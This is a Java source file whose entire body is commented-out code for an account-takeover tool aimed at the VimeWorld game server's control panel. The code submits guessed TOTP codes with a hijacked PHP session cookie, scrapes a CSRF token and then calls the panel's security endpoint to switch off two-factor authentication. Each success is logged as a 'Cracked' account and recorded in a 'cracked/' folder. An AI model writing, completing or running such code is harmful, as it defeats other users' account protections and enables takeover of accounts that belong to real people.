package implario.vimeworld._2fa;

import lombok.experimental.UtilityClass;

@UtilityClass
public class Pipeline {

//	public static void login(Account account) {
//
//		Request request = new Request("https://cp.vimeworld.ru/login_2fa", Method.POST);
//
//		request.body("totp", account.getCurrentCode());
//		request.body("continue", "Продолжить");
//
//		Response response = sessionRequest(account, request);
//		int code = response.getCode();
//
//		String location = response.getHeader("location");
//		System.out.println(account.getUsername() + " " + account.getCurrentCode() + ": " + code + " (" + location + ")");
//		if ("index".equals(location)) {
//			csrfFetch(account);
//			disable2fa(account);
//		} else account.setLastRequestTime(System.currentTimeMillis());
//
//	}
//
//	private static final Pattern loginValidPatern = Pattern.compile("<div class=\"wrap\">(.*)<div class=\"form-signin-heading\">");
//	private static final Pattern loginResultPatern = Pattern.compile("</button>(.*)</div>");
//
//	public static void loginResult(Account account) {
//		Request request = new Request("https://cp.vimeworld.ru/login_2fa", Method.GET);
//
//		Response response = sessionRequest(account, request);
//		int code = response.getCode();
//		if (code == 503) {
//			System.out.println("503: " + response);
//			loginResult(account);
//			return;
//		}
//
//		String s = new String(response.getBody()).replace("\n", "");
//
//		Matcher validityMatcher = loginValidPatern.matcher(s);
//		if (!validityMatcher.find()) {
//			throw new RuntimeException("Invalid response from login page: " + s);
//		}
//		String resultHtml = validityMatcher.group(1);
//		Matcher resultMatcher = loginResultPatern.matcher(resultHtml);
//		if (resultMatcher.find()) {
//
//			String result = resultMatcher.group(1);//.replaceAll("[^А-Яа-яЁё]+", "");
//			long time = System.currentTimeMillis();
//			String comment = account.getLastSuccessfulAttempt() == 0 ? "no successful attempts before" :
//					time - account.getLastSuccessfulAttempt() + "ms. since last successful attempt";
//			System.out.println(account.getCurrentCode() + ": " + result + ", length: " + result.length() + " (" + comment + ")");
//			if (result.length() > 90) account.setLastSuccessfulAttempt(time);
//
//		} else {
//			throw new RuntimeException("Invalid login result: " + resultHtml);
//		}
//	}
//
//	private static final Pattern csrfPattern = Pattern.compile("csrf_token: '([0-9a-f]+)'");
//
//	public static void csrfFetch(Account account) {
//
//		Request request = new Request("https://cp.vimeworld.ru/security", Method.GET);
//
//		Response response = sessionRequest(account, request);
//
//		Matcher matcher = csrfPattern.matcher(new String(response.getBody()));
//		if (!matcher.find()) throw new TotpFailException("CSRF-token wasn't found.");
//		String csrfToken = matcher.group(1);
//
//		account.setCsrfToken(csrfToken);
//		System.out.println(account.getUsername() + " CSRF-token retreived successfully.");
//
//	}
//
//	private static final Pattern errorPatern =
//			Pattern.compile("\\{\"state\":\"(error|success)\",\"msg\":\"([\\\\a-zA-Z0-9_ ]*)\"}");
//
//	public static boolean disable2fa(Account account) {
//
//		Request request = new Request("https://cp.vimeworld.ru/ajax/security.php", Method.POST);
//		request.header("referer", "https://cp.vimeworld.ru/security");
//		request.header("x-requested-with", "XMLHttpRequest");
//
//		request.body("action", "totp-disable");
//		request.body("totp", account.getCurrentCode());
//		request.body("csrf_token", account.getCsrfToken());
//
//		Response response = sessionRequest(account, request);
//
//		String json = new String(response.getBody());
//		Matcher matcher = errorPatern.matcher(json);
//		if (!matcher.find()) throw new TotpFailException("Invalid response: " + json);
//		String group = matcher.group(1);
//		String message = matcher.group(2);
//		System.out.println(account.getUsername() + " " + account.getCurrentCode() + ": " +
//				Unescape.unescape_perl_string(message));
//		if (!group.equals("success")) return false;
//
//		account.setUnlocked(true);
//		try {
//			File file = new File("cracked/" + account.getUsername() + ".txt");
//			file.getParentFile().mkdir();
//			file.createNewFile();
//		} catch (IOException e) {
//			e.printStackTrace();
//		}
//
//		System.out.println("!!! Cracked " + account.getUsername() +
//				" with code " + account.getCurrentCode() +
//				" at " + new Date(account.getLastRequestTime()));
//		return true;
//
//	}
//
//	private static Response sessionRequest(Account account, Request request) {
//		try {Thread.sleep(250);} catch (InterruptedException ignored) {}
//		request.header("content-type", NetUtil.CONTENTTYPE);
//		request.header("user-agent", NetUtil.USERAGENT);
//		request.cookie(new RawCookie("PHPSESSID", account.getPhpsessid()));
//		return request.execute(Proxy.NO_PROXY);
//	}

}
